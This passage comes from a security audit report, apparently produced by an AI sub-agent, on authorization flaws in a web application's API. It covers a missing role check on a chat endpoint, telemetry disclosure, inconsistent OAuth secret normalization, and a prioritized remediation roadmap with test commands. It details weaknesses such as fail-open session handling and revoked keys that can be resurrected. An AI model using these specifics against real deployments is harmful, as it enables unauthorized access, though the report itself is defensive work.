- **Target File & Lines**: `api/chat.js:144-166, 178-183`
- **CWE / OWASP**: CWE-285 (Improper Authorization) / OWASP API Security Top 10 - API5:2023 Broken Function Level Authorization
- **Root Cause**: `api/chat.js` performs `validateSession`, but never checks `auth.role !== 'master' && auth.role !== 'temporary'`. Additionally, `/api/chat?action=telemetry` discloses model infrastructure metadata to any caller without requiring `master` role.
- **Threat Scenario**: A low-privilege guest or unauthorized session accesses system telemetry, discovering upstream AI provider configurations, internal model names, and key counts.
- **Defensive Remediation**:
  1. Add strict role checks after `validateSession` in `api/chat.js`:
     ```javascript
     if (auth.role !== 'master' && auth.role !== 'temporary') {
       auditLog('INSUFFICIENT_PRIVILEGES', req, 'Endpoint: /api/chat');
       return sendSecureJson(res, 403, { error: 'Forbidden: AI Studio chat requires authenticated session.' });
     }
     ```
  2. Restrict detailed telemetry key pool counts and names to `auth.role === 'master'`.
- **Verification Method (Automated Test Specification)**:
  Call `POST /api/chat` using a session with an unrecognized role (e.g. `role: 'guest'`). Assert HTTP 403 Forbidden is returned.

---

### VULN-AUTH-R6-15: OAuth Secret Normalization Discrepancy Across Edge Functions
- **Target File & Lines**: `api/calendar.js:269, 385`
- **CWE / OWASP**: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm) / OWASP API Security Top 10 - API2:2023 Broken Authentication
- **Root Cause**: `api/calendar.js` uses `process.env.ADMIN_PASSWORD` directly without `.trim().replace(/^["']|["']$/g, '').trim()`, unlike `api/auth.js` and `api/_lib/auth-guard.js` which normalize candidate secrets.
- **Threat Scenario**: If `ADMIN_PASSWORD` is enclosed in quotes in Vercel environment variables, OAuth state HMAC signature generation or validation may fail or become vulnerable to mismatch across different serverless endpoints.
- **Defensive Remediation**:
  Apply normalized secret extraction:
  ```javascript
  const rawSecret = process.env.ADMIN_PASSWORD || process.env.GOOGLE_CLIENT_SECRET;
  const oauthSecret = rawSecret ? rawSecret.trim().replace(/^["']|["']$/g, '').trim() : '';
  ```
- **Verification Method (Automated Test Specification)**:
  Set `ADMIN_PASSWORD = '"secret_with_quotes"'`. Call `handleAuth`, capture `state`, and verify that `handleCallback` validates the state signature successfully.

---

## 4. Caveats

1. **Hardware Firmware Boundary**: The physical ESP32 firmware files (`firmware/**`) were not modified, in accordance with the project invariant. The IoT gateway security findings and recommendations are strictly limited to the cloud gateway controller (`api/iot.js`).
2. **Read-Only Investigation**: In compliance with the sub-agent instructions, no source files were directly edited during this audit. All findings are presented with production-ready, surgical remediation specifications.
3. **Third-Party Upstream Assumptions**: Google Calendar API and GitHub Storage API are assumed to follow RFC specifications. Potential third-party rate limits or external service outages are handled via fail-closed error handling.

---

## 5. Conclusion & Recommended Remediation Roadmap

The LuminaVista OS authentication architecture contains strong sovereign cryptographic foundations (HMAC-SHA256 session tokens, timing-safe equality comparisons, anti-replay nonces, and payload caps). However, critical authorization gaps exist at the service boundaries where different roles and unauthenticated callers interact:

1. **Immediate P0 Action**: Patch `api/calendar.js:754-768` to ensure that requests lacking a `gcal_token` cookie fail closed with HTTP 401 unless accompanied by a valid session.
2. **Immediate P1 Action**: Eliminate fail-open session mocking in `api/_lib/auth-guard.js:105-112` for non-Vercel environments.
3. **Immediate P1 Action**: Restrict mutations on `master_workspace_state` (`api/sync.js`), global scheduled tasks (`api/worker.js`), and storage deletion (`api/storage.js`) exclusively to `auth.role === 'master'`.
4. **Immediate P1 Action**: Fix the zombie key resurrection issue by persisting revocation tombstones indefinitely in Redis and verifying `admin:revoked_key:${keyId}` during `validateSession`.
5. **Immediate P2 Action**: Bind the OAuth `state` parameter in `api/calendar.js` to the user's session or an anti-CSRF cookie to prevent OAuth account linking attacks.

---

## 6. Verification Method

To independently verify these findings, execute the project test and lint suites, and run targeted verification harnesses:

### Core Test Commands:
```bash
# 1. Full Unit Test Suite (1,102 assertions)
node tests/features.test.cjs

# 2. Recheck Audit Suite (42 assertions)
node tests/recheck-all-tasks.cjs

# 3. Syntax Linter (40 JS modules)
node tests/lint.cjs

# 4. Challenger Calendar Empirical Suite (63 assertions)
node tests/challenger-calendar-empirical.cjs

# 5. Adversarial Calendar Controller Harness (109 probes)
node tests/adversarial-calendar.test.cjs

# 6. Adversarial Calendar Probe Suite (25 tests)
node tests/suite-calendar-adversarial.cjs

# 7. Chrome Browser CDP Suite (122 tests)
node tests/browser-cdp-test.cjs
```

### Invalidation Conditions:
- If `api/calendar.js` is patched to require `session.valid` for all `POST`/`DELETE` calls and unauthenticated `GET /sync` when cookie is absent, VULN-AUTH-R6-01 is invalidated.
- If `validateSession` is patched so that `!sessionId` always returns `{ valid: false, status: 401 }`, VULN-AUTH-R6-02 is invalidated.
- If `validateSession` checks `admin:revoked_key:${keyId}` from `sessionRecord`, VULN-AUTH-R6-07 is invalidated.
